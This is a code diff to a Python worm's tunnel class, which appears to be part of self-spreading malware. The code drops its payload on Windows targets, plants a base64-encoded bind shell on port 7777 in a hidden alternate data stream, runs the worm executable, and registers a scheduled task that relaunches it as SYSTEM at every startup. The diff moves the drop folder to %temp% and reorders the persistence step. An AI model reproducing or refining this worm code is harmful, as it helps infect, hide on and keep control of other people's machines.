@@ -24,7 +24,7 @@ class tunnel(threading.Thread):
         
         osplatform = "windows"
         if osplatform == "windows":
-            dir = "/Users/Public/"
+            dir = "%temp%"
         else:
             dir = "/tmp/"
         self.deploy_virus(self.worm.getfiledata(),conn, osplatform, dir)
@@ -35,7 +35,7 @@ class tunnel(threading.Thread):
     def sent_command(self, command, conn):
         print(command)
         conn.send(command)
-        time.sleep(1)
+        time.sleep(2)
         
     def sent_large_command(self, command, conn):
         #print(command)
@@ -97,7 +97,7 @@ class tunnel(threading.Thread):
         print("Create a Bind Shell on Port 7777")
         print(self.get_response(conn,8192))
 
-        command = 'Set-Content -path "C:/{}remain.tmp:hidden" -Value "'.format(dir).encode()
+        command = 'Set-Content -path "{}/remain.tmp:hidden" -Value "'.format(dir).encode()
         command += self.generate_base64_bind_shell_code("windows").encode()
         command += b'"'
         command+=b"\n"
@@ -154,17 +154,27 @@ class tunnel(threading.Thread):
             self.sent_command(command,conn)
             print("target machine is starting to connect to the us")
             print("Target Response: {}".format(self.get_response(conn,1024)))
-            time.sleep(5)
+            time.sleep(10)
+            #Setup Self execute on startup
+            command = 'schtasks /create /tn "scannerr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "{}/{}_tworm.exe";'.format(dir,self.lhost).encode()
+            command+=b"\n"
+            self.sent_command(command,conn)
+            time.sleep(2)
+            tasks_response = self.get_response(conn,1024)
+            if "already exists" in tasks_response:
+                command = b'Y'
+                command+=b'\n'
+                self.sent_command(command,conn)
+                tasks_response = self.get_response(conn,1024)
+            print("Target Response: {}".format(tasks_response))
+            
+            #execute the worm
             command = "./{}_tworm.exe".format(self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("Target Response: {}".format(self.get_response(conn,1024)))
             
-            #Setup Self execute on startup
-            command = 'schtasks /create /tn "scannerr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "C:/{}{}_tworm.exe"'.format(dir,self.lhost).encode()
-            command+=b"\n"
-            self.sent_command(command,conn)
-            print("Target Response: {}".format(self.get_response(conn,1024)))
+            
             
         except TimeoutError as t:
             print("no Response")
